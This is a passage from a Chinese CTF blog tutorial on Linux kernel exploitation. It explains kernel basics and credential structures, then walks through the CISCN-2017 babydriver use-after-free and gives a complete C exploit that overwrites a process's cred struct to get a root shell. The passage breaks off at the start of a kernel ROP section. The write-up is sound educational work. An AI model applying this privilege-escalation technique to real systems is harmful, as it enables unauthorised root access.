      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Basic Kernel Exploitation</title>
    <link href="blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/"/>
    <id>blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/</id>
    <published>2020-04-26T15:26:55.000Z</published>
    <updated>2020-05-17T07:54:10.485Z</updated>
    
    <content type="html"><![CDATA[<p>初涉 Kernel Exploit。</p><a id="more"></a><blockquote><p>基本是跟着 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">CTF-Wiki</a> 和 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x 师傅</a>做的内容。</p></blockquote><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p>一部分内容在 <a href="https://github.com/qianfei11/UnixNotebook" target="_blank" rel="noopener">Unix 系统分析课的笔记</a>中有所记录。</p><h2 id="What-is-kernel"><a href="#What-is-kernel" class="headerlink" title="What is kernel?"></a>What is kernel?</h2><p>Kernel 是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。最主要的功能有两点（包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能）：</p><ol><li>控制并与硬件进行交互；</li><li>提供 Application 能运行的环境。</li></ol><blockquote><p>应用程序的 crash 直接终止程序，而内核的 crash 会直接引发重启。</p></blockquote><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>Intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2 和 Ring 3。Ring 0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。而使用 Ring Model 是为了提升系统安全性。</p><blockquote><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p></blockquote><h2 id="Loadable-Kernel-Modules（LKMs）"><a href="#Loadable-Kernel-Modules（LKMs）" class="headerlink" title="Loadable Kernel Modules（LKMs）"></a>Loadable Kernel Modules（LKMs）</h2><p>可加载核心模块（内核模块）就像运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序（Device Drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><blockquote><p>LKMs 的文件格式和用户态的可执行程序相同，因此可以使用 IDA 等工具来分析内核模块。</p></blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核（Monolithic Kernel）。单内核的优点是效率高，所有的内容都集合在一起，但是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装。</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><code>ioctl</code> 是一个系统调用，用于与设备通信：</p><pre><code class="txt">IOCTL(2)                    BSD System Calls Manual                   IOCTL(2)NAME     ioctl -- control deviceSYNOPSIS     #include &lt;sys/ioctl.h&gt;     int     ioctl(int fildes, unsigned long request, ...);DESCRIPTION     The ioctl() function manipulates the underlying device parameters of special files.  In particular, many operat-     ing characteristics of character special files (e.g. terminals) may be controlled with ioctl() requests.  The     argument fildes must be an open file descriptor.     An  ioctl request has encoded in it whether the argument is an ``in&#39;&#39; parameter or ``out&#39;&#39; parameter, and the     size of the argument argp in bytes.  Macros and defines used in specifying an ioctl request are located in the     file &lt;sys/ioctl.h&gt;.</code></pre><ul><li>第一个参数 <code>fildes</code> 为打开设备返回的文件描述符；</li><li>第二个参数 <code>request</code> 为用户程序对设备的控制命令；</li><li>再后边的参数则是一些补充参数，与设备有关。</li></ul><p>内核使用 <code>ioctl</code> 进行通信的原因：</p><ul><li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址，但访问非标准硬件设备这些系统调用显得不合适，有时候用户模式可能需要直接访问设备；</li><li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 <code>ioctl</code> 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li></ul><h2 id="Status-Switching"><a href="#Status-Switching" class="headerlink" title="Status Switching"></a>Status Switching</h2><h3 id="User-Space-to-Kernel-Space"><a href="#User-Space-to-Kernel-Space" class="headerlink" title="User Space to Kernel Space"></a>User Space to Kernel Space</h3><p>当发生<strong>系统调用</strong>、产生<strong>异常、</strong>外设产生<strong>中断</strong>等事件时，会发生用户态到内核态的切换。步骤如下：</p><ol><li>用 <code>SWAPGS</code> 指令切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用；</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 RSP/ESP；</li><li>用 PUSH 指令保存各寄存器值；</li><li>判断是否为 <code>x32_abi</code>；</li><li>根据系统调用号跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><p><a href="https://elixir.bootlin.com/linux/v4.12/source/arch/x86/entry/entry_64.S#L136" target="_blank" rel="noopener">保存用户态各个寄存器的值</a>：</p><pre><code class="nasm">ENTRY(entry_SYSCALL_64)    /*     * Interrupts are off on entry.     * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,     * it is too small to ever cause noticeable irq latency.     */    SWAPGS_UNSAFE_STACK    /*     * A hypervisor implementation might want to use a label     * after the swapgs, so that it can do the swapgs     * for the guest and jump here on syscall.     */GLOBAL(entry_SYSCALL_64_after_swapgs)    movq    %rsp, PER_CPU_VAR(rsp_scratch)    movq    PER_CPU_VAR(cpu_current_top_of_stack), %rsp    TRACE_IRQS_OFF    /* Construct struct pt_regs on stack */    pushq    $__USER_DS            /* pt_regs-&gt;ss */    pushq    PER_CPU_VAR(rsp_scratch)    /* pt_regs-&gt;sp */    pushq    %r11                /* pt_regs-&gt;flags */    pushq    $__USER_CS            /* pt_regs-&gt;cs */    pushq    %rcx                /* pt_regs-&gt;ip */    pushq    %rax                /* pt_regs-&gt;orig_ax */    pushq    %rdi                /* pt_regs-&gt;di */    pushq    %rsi                /* pt_regs-&gt;si */    pushq    %rdx                /* pt_regs-&gt;dx */    pushq    %rcx                /* pt_regs-&gt;cx */    pushq    $-ENOSYS            /* pt_regs-&gt;ax */    pushq    %r8                /* pt_regs-&gt;r8 */    pushq    %r9                /* pt_regs-&gt;r9 */    pushq    %r10                /* pt_regs-&gt;r10 */    pushq    %r11                /* pt_regs-&gt;r11 */    sub    $(6*8), %rsp            /* pt_regs-&gt;bp, bx, r12-15 not saved */</code></pre><h3 id="Kernel-Space-to-User-Space"><a href="#Kernel-Space-to-User-Space" class="headerlink" title="Kernel Space to User Space"></a>Kernel Space to User Space</h3><p>退出内核态的步骤如下：</p><ol><li>通过 <code>SWAPGS</code> 恢复 GS 值；</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户上下文继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, EFLAGS/RFLAGS, ESP/RSP 等）。</li></ol><h2 id="Process-Structure"><a href="#Process-Structure" class="headerlink" title="Process Structure"></a>Process Structure</h2><p>Kernel 中使用 <a href="https://elixir.bootlin.com/linux/v4.12/source/include/linux/cred.h#L110" target="_blank" rel="noopener"><code>cred</code> 结构体</a>记录进程的权限等信息（uid、gid 等），如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p><pre><code class="cpp">/* * The security context of a task * * The parts of the context break down into two categories: * *  (1) The objective context of a task.  These parts are used when some other *    task is attempting to affect this one. * *  (2) The subjective context.  These details are used when the task is acting *    upon another object, be that a file, a task, a key or whatever. * * Note that some members of this structure belong to both categories - the * LSM security pointer for instance. * * A task has two security pointers.  task-&gt;real_cred points to the objective * context that defines that task&#39;s actual details.  The objective part of this * context is used whenever that task is acted upon. * * task-&gt;cred points to the subjective context that defines the details of how * that task is going to act upon another object.  This may be overridden * temporarily to point to another security context, but normally points to the * same context as task-&gt;real_cred. */struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><h2 id="Functions-in-Kernel"><a href="#Functions-in-Kernel" class="headerlink" title="Functions in Kernel"></a>Functions in Kernel</h2><p>内核态中的函数对应用户态函数：</p><ul><li><code>printf()</code> -&gt; <code>printk()</code><ul><li><code>printk()</code> 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li></ul></li><li><code>memcpy()</code> -&gt; <code>copy_from_user()</code>/<code>copy_to_user()</code><ul><li><code>copy_from_user()</code>：实现了将用户空间的数据传送到内核空间</li><li><code>copy_to_user()</code>：实现了将内核空间的数据传送到用户空间</li></ul></li><li><code>malloc()</code> -&gt; <code>kmalloc()</code><ul><li>内核态的内存分配函数，和 <code>malloc()</code> 相似，但使用的是 <code>slab/slub</code> 分配器</li></ul></li><li><code>free()</code> -&gt; <code>kfree()</code>，同 <code>kmalloc()</code></li></ul><p>同时 Kernel 中有两个（<a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L423" target="_blank" rel="noopener"><code>int commit_creds(struct cred *new)</code></a> 和 <a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L595" target="_blank" rel="noopener"><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code></a>）可以改变权限的函数：</p><pre><code class="cpp">/** * commit_creds - Install new credentials upon the current task * @new: The credentials to be assigned * * Install a new set of credentials to the current task, using RCU to replace * the old set.  Both the objective and the subjective credentials pointers are * updated.  This function may not be called if the subjective credentials are * in an overridden state. * * This function eats the caller&#39;s reference to the new credentials. * * Always returns 0 thus allowing this function to be tail-called at the end * of, say, sys_setgid(). */int commit_creds(struct cred *new){    struct task_struct *task = current;    const struct cred *old = task-&gt;real_cred;    kdebug(&quot;commit_creds(%p{%d,%d})&quot;, new,           atomic_read(&amp;new-&gt;usage),           read_cred_subscribers(new));    BUG_ON(task-&gt;cred != old);#ifdef CONFIG_DEBUG_CREDENTIALS    BUG_ON(read_cred_subscribers(old) &lt; 2);    validate_creds(old);    validate_creds(new);#endif    BUG_ON(atomic_read(&amp;new-&gt;usage) &lt; 1);    get_cred(new); /* we will require a ref for the subj creds too */    /* dumpability changes */    if (!uid_eq(old-&gt;euid, new-&gt;euid) ||        !gid_eq(old-&gt;egid, new-&gt;egid) ||        !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||        !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||        !cred_cap_issubset(old, new)) {        if (task-&gt;mm)            set_dumpable(task-&gt;mm, suid_dumpable);        task-&gt;pdeath_signal = 0;        smp_wmb();    }    /* alter the thread keyring */    if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))        key_fsuid_changed(task);    if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))        key_fsgid_changed(task);    /* do it     * RLIMIT_NPROC limits on user-&gt;processes have already been checked     * in set_user().     */    alter_cred_subscribers(new, 2);    if (new-&gt;user != old-&gt;user)        atomic_inc(&amp;new-&gt;user-&gt;processes);    rcu_assign_pointer(task-&gt;real_cred, new);    rcu_assign_pointer(task-&gt;cred, new);    if (new-&gt;user != old-&gt;user)        atomic_dec(&amp;old-&gt;user-&gt;processes);    alter_cred_subscribers(old, -2);    /* send notifications */    if (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||        !uid_eq(new-&gt;euid,  old-&gt;euid) ||        !uid_eq(new-&gt;suid,  old-&gt;suid) ||        !uid_eq(new-&gt;fsuid, old-&gt;fsuid))        proc_id_connector(task, PROC_EVENT_UID);    if (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||        !gid_eq(new-&gt;egid,  old-&gt;egid) ||        !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||        !gid_eq(new-&gt;fsgid, old-&gt;fsgid))        proc_id_connector(task, PROC_EVENT_GID);    /* release the old obj and subj refs both */    put_cred(old);    put_cred(old);    return 0;}/** * prepare_kernel_cred - Prepare a set of credentials for a kernel service * @daemon: A userspace daemon to be used as a reference * * Prepare a set of credentials for a kernel service.  This can then be used to * override a task&#39;s own credentials so that work can be done on behalf of that * task that requires a different subjective context. * * @daemon is used to provide a base for the security record, but can be NULL. * If @daemon is supplied, then the security data will be derived from that; * otherwise they&#39;ll be set to 0 and no groups, full capabilities and no keys. * * The caller may change these controls afterwards if desired. * * Returns the new credentials or NULL if out of memory. * * Does not take, and does not return holding current-&gt;cred_replace_mutex. */struct cred *prepare_kernel_cred(struct task_struct *daemon){    const struct cred *old;    struct cred *new;    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);    if (!new)        return NULL;    kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);    if (daemon)        old = get_task_cred(daemon);    else        old = get_cred(&amp;init_cred);    validate_creds(old);    *new = *old;    atomic_set(&amp;new-&gt;usage, 1);    set_cred_subscribers(new, 0);    get_uid(new-&gt;user);    get_user_ns(new-&gt;user_ns);    get_group_info(new-&gt;group_info);#ifdef CONFIG_KEYS    new-&gt;session_keyring = NULL;    new-&gt;process_keyring = NULL;    new-&gt;thread_keyring = NULL;    new-&gt;request_key_auth = NULL;    new-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;#endif#ifdef CONFIG_SECURITY    new-&gt;security = NULL;#endif    if (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)        goto error;    put_cred(old);    validate_creds(new);    return new;error:    put_cred(new);    put_cred(old);    return NULL;}</code></pre><p>执行 <code>commit_creds(prepare_kernel_cred(0));</code> 即可获得 root 权限。两个函数的地址都可以在 <code>/proc/kallsyms</code> 文件中查看：</p><pre><code class="bash">$ sudo cat /proc/kallsyms | grep -E &quot;commit_creds|prepare_kernel_cred&quot;ffffffff810a24a0 T commit_credsffffffff810a2890 T prepare_kernel_credffffffff81d7f6c0 R __ksymtab_commit_credsffffffff81d881d0 R __ksymtab_prepare_kernel_credffffffff81d9f028 r __kcrctab_commit_credsffffffff81da35b0 r __kcrctab_prepare_kernel_credffffffff81db01e7 r __kstrtab_prepare_kernel_credffffffff81db022e r __kstrtab_commit_creds</code></pre><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><ul><li>CANARY、DEP、PIE、RELRO 等保护与用户态原理和作用相同；</li><li>smep（Supervisor Mode Execution Protection）：当处理器处于 Ring 0 模式时，执行用户空间的代码会触发页错误；</li><li>smap（Superivisor Mode Access Protection）：类似于 smep，通常是在访问数据时；</li><li>mmap_min_addr：控制着 mmap 能够映射的最低内存地址。</li></ul><h1 id="Kernel-UAF（CISCN-2017-babydriver）"><a href="#Kernel-UAF（CISCN-2017-babydriver）" class="headerlink" title="Kernel UAF（CISCN-2017-babydriver）"></a>Kernel UAF（CISCN-2017-babydriver）</h1><p>题目中给了三个文件，<code>boot.sh</code>、<code>bzImage</code> 和 <code>rootfs.cpio</code>。<code>bzImage</code> 即为被压缩的内核可执行文件；<code>boot.sh</code> 为 QEMU 的启动脚本：</p><pre><code class="bash">$ tar -xvf babydriver.tarx boot.shx bzImagex rootfs.cpio$ file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA$ bat boot.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: boot.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console       │ =ttyS0 root=/dev/ram oops=panic panic=1&#39; -enable-kvm -monitor /dev/null       │  -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来主要看文件系统 <code>rootfs.cpio</code>。用 <code>gunzip</code> 对其进行解压缩，可以看到用的是 4.4.72 的内核，然后可以看到根目录下有一个 init 启动脚本，用来设置 flag 的相关权限和安装 babydriver 模块。也就是说只有变成 root 才能查看 flag：</p><pre><code class="bash">$ file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix$ mv rootfs.cpio rootfs.cpio.gz$ gunzip ./rootfs.cpio.gz$ file rootfs.cpiorootfs.cpio: ASCII cpio archive (SVR4 with no CRC)$ mkdir fs &amp;&amp; cd fs$ cpio -idmv &lt; ../rootfs.cpio.etcetc/init.detc/passwdetc/groupbin...initprocliblib/moduleslib/modules/4.4.72lib/modules/4.4.72/babydriver.kosysusr...tmplinuxrchomehome/ctf5556 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │   3   │ mount -t proc none /proc   4   │ mount -t sysfs none /sys   5   │ mount -t devtmpfs devtmpfs /dev   6   │ chown root:root flag   7   │ chmod 400 flag   8   │ exec 0&lt;/dev/console   9   │ exec 1&gt;/dev/console  10   │ exec 2&gt;/dev/console  11   │  12   │ insmod /lib/modules/4.4.72/babydriver.ko  13   │ chmod 777 /dev/babydev  14   │ echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;  15   │ setsid cttyhack setuidgid 1000 sh  16   │  17   │ umount /proc  18   │ umount /sys  19   │ poweroff -d 0  -f  20   │───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来看 <code>babydriver.ko</code> 的相关保护，和 ELF 是类似的这里只开了 NX：</p><pre><code class="bash">$ file babydriver.kobabydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped$ checksec ./babydriver.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>接下来进 IDA 看看有哪些函数。先了解一个<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cdev.h#L12" target="_blank" rel="noopener">结构体 <code>cdev</code></a>（每个字符设备都对应一个 <code>cdev</code> 结构的变量）：</p><pre><code class="cpp">struct cdev {    struct kobject kobj; // 每个cdev都是一个kobject    struct module *owner; // owner指向实现驱动的模块    const struct file_operations *ops; // 操纵这个字符设备的方法    struct list_head list; // 与cdev对应的字符设备文件的inode链表头    dev_t dev; // 起始设备编号    unsigned int count; // 设备范围号大小};</code></pre><p>首先是模块的入口函数 <code>babydriver_init</code>，主要是一系列对 <code>/dev/babydev</code> 设备的注册：</p><pre><code class="cpp">int __cdecl babydriver_init(){  int v0; // edx  __int64 v1; // rsi  int v2; // ebx  class *v3; // rax  __int64 v4; // rax  if ( (signed int)alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, &quot;babydev&quot;) &gt;= 0 ) // 动态分配设备编号  {    cdev_init(&amp;cdev_0, &amp;fops); // 静态初始化cdev    v1 = babydev_no;    cdev_0.owner = &amp;_this_module; // 设置owner为指定模块    v2 = cdev_add(&amp;cdev_0, babydev_no, 1LL); // 将cdev添加到系统中    if ( v2 &gt;= 0 )    {      v3 = (class *)_class_create(&amp;_this_module, &quot;babydev&quot;, &amp;babydev_no); // 将babydev注册到内核中      babydev_class = v3;      if ( v3 )      {        v4 = device_create(v3, 0LL, babydev_no, 0LL, &quot;babydev&quot;); // 创建设备节点        v0 = 0;        if ( v4 ) // 创建成功          return v0;        printk(&amp;unk_351, 0LL); // 创建设备节点失败        class_destroy(babydev_class); // 取消注册      }      else // 注册失败      {        printk(&amp;unk_33B, &quot;babydev&quot;);      }      cdev_del(&amp;cdev_0); // 从系统中删除cdev    }    else // 分配失败    {      printk(&amp;unk_327, v1);    }    unregister_chrdev_region(babydev_no, 1LL); // 释放设备号    return v2;  }  printk(&amp;unk_309, 0LL);  return 1;}</code></pre><p>然后在模块退出函数中对设备等进行删除和释放资源：</p><pre><code class="cpp">void __cdecl babydriver_exit(){  device_destroy(babydev_class, babydev_no);  class_destroy(babydev_class);  cdev_del(&amp;cdev_0);  unregister_chrdev_region(babydev_no, 1LL);}</code></pre><p>在 <code>babyioctl</code> 中可以看到模块中有一个结构体 <code>babydev_struct</code>。首先调用 <code>kfree</code> 释放对应的 <code>device_buf</code>，然后调用 <code>kmalloc</code> 指定大小的内存，并设置 <code>device_buf_len</code>：</p><pre><code class="cpp">// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){  size_t v3; // rdx  size_t len; // rbx  __int64 result; // rax  _fentry__(filp, *(_QWORD *)&amp;command, arg);  len = v3;  if ( command == 0x10001 )  {    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = (char *)_kmalloc(len, 0x24000C0LL);    babydev_struct.device_buf_len = len;    printk(&quot;alloc done\n&quot;, 0x24000C0LL);    result = 0LL;  }  else  {    printk(&amp;unk_2EB, v3);    result = -22LL;  }  return result;}</code></pre><p>在 <code>babyopen</code> 中打开：</p><pre><code class="cpp">int __fastcall babyopen(inode *inode, file *filp){  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 0x40LL;  printk(&quot;device open\n&quot;, 0x24000C0LL);  return 0;}</code></pre><p><code>babyread</code> 中调用 <code>copy_to_user</code> 从 <code>babydev_struct.device_buf</code> 读取指定的字符串到用户空间：</p><pre><code class="cpp">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_to_user(buffer);  result = v6;  return result;}</code></pre><p><code>babywrite</code> 调用 <code>copy_from_user</code> 读一段数据到 <code>babydev_struct.device_buf</code> 上：</p><pre><code class="cpp">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_from_user();  result = v6;  return result;}</code></pre><p>最后 <code>babyrelease</code> 函数将 <code>device_buf</code> 对应的内存释放：</p><pre><code class="cpp">int __fastcall babyrelease(inode *inode, file *filp){  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\n&quot;, filp);  return 0;}</code></pre><p>这里的漏洞在于 <code>babyopen</code> 处没有检查打开了几个设备，存在 Use After Free，具体利用方法如下：</p><ol><li>打开两次 <code>/dev/babydev</code>，第二次的分配会覆盖到第一次分配的内存，然后释放第一次分配的内存；</li><li>创建一个新进程，新进程中的 <code>cred</code> 结构体和之前释放的重叠，也就是修改第二次的 <code>babydev</code> 就能改到新进程的 <code>cred</code> 结构体；</li><li>创建时将第二次的 <code>babydev</code> 改成对应 <code>cred</code> 结构体的大小（如下），然后把对应偏移处的 <code>gid</code> 和 <code>uid</code> 改为 0，就实现了提权到 root。</li></ol><pre><code class="cpp">struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() {    int fd1, fd2, pid;    fd1 = open(&quot;/dev/babydev&quot;, 2);    fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8); // 修改babydev_struct.device_buf_len的长度为cred结构体的长度    close(fd1); // 释放第一次的内存    pid = fork(); // 创建进程    if (pid &lt; 0) {        puts(&quot;[!] fork error...&quot;);        exit(-1);    } else if (pid == 0) { // 子进程        uint8_t fake_cred[30];        memset(fake_cred, 0, sizeof(fake_cred));        write(fd2, fake_cred, 28);        if (getuid() == 0) {            puts(&quot;[+] get root!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        }    } else {        wait(NULL);    }    close(fd2);    return 0;}</code></pre><p>因为文件系统中没有 Library，需要静态编译才能正常执行。然后打包新的文件系统后运行 <code>boot.sh</code>：</p><pre><code class="bash">$ makecc -static    exp.c   -o exp$ file ./exp./exp: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=8af26f6763d0d44db98089ae847f6104a4054c93, not stripped$ cd fs/ &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio7349 blocks$ cd .. &amp;&amp; sudo ./boot.sh</code></pre><p>使用 lsmod 可以查看加载模块的基地址：</p><pre><code class="bash">/ $ lsmodbabydriver 16384 0 - Live 0xffffffffc0000000 (OE)/ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)/ $ cat flagcat: can&#39;t open &#39;flag&#39;: Permission denied/ $ /tmp/exp[   23.769095] device open[   23.773231] device open[   23.775415] alloc done[   23.784434] device release[+] get root!/ # iduid=0(root) gid=0(root) groups=1000(ctf)/ # cat flagflag{this_is_a_flag}/ #</code></pre><blockquote><p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">P4nda</a> 以及 <a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anceity</a> 两位大佬都提供了 ROP 的做法。</p></blockquote><h1 id="Kernel-ROP（QWB-2018-core）"><a href="#Kernel-ROP（QWB-2018-core）" class="headerlink" title="Kernel ROP（QWB-2018-core）"></a>Kernel ROP（QWB-2018-core）</h1><p>题目给了四个文件，vmlinux 即为 bzImage 未解压缩的版本（可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener"><code>extract-vmlinux</code></a> 来对 <code>bzImage</code> 解压缩）。<code>start.sh</code> 是一个启动脚本，其中可以看到开了 <code>kalsr</code>：</p><pre><code class="bash">$ tar -zxvf 